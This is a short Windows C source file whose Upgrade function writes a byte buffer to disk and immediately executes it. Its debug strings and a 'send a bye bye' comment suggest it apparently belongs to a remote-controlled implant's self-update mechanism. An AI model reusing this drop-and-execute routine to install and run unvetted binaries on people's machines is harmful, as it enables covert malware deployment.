#include <Windows.h>
#include <stdio.h>

#include "upgrade.h"

BOOL Upgrade(PWCHAR pUpgradePath, PBYTE pFileBuffer, ULONG uFileLength)
{
#ifdef _DEBUG
	PWCHAR pDebugString = (PWCHAR)malloc(1024 * sizeof(WCHAR));
	swprintf_s(pDebugString, 1024, L"[+] Dumping %d bytes of upgrade to %s\n", uFileLength, pUpgradePath);
	OutputDebugString(pDebugString);
	free(pDebugString);
#endif
	HANDLE hFile = CreateFile(pUpgradePath, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile)
	{
		ULONG uOut;
		WriteFile(hFile, pFileBuffer, uFileLength, &uOut, NULL);
		CloseHandle(hFile);

		STARTUPINFO si;
		PROCESS_INFORMATION pi;
		
		SecureZeroMemory(&si, sizeof(STARTUPINFO));
		SecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
		si.cb = sizeof(si);

		if (GetCurrentProcessId() == 4)
			MessageBox(NULL, L"I'm going to start it", L"WARNING", 0);

		if (CreateProcess(pUpgradePath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
			return TRUE; // FIXME: should send a bye bye.
		else
		{
#ifdef _DEBUG
			OutputDebugString(L"[!!] Error executing upgrade\n");
#endif
			return FALSE;
		}
	}
	else
	{
#ifdef _DEBUG
		OutputDebugString(L"[!!] Cannot create upgrade file!!\n");		
#endif
		return FALSE;
	}
}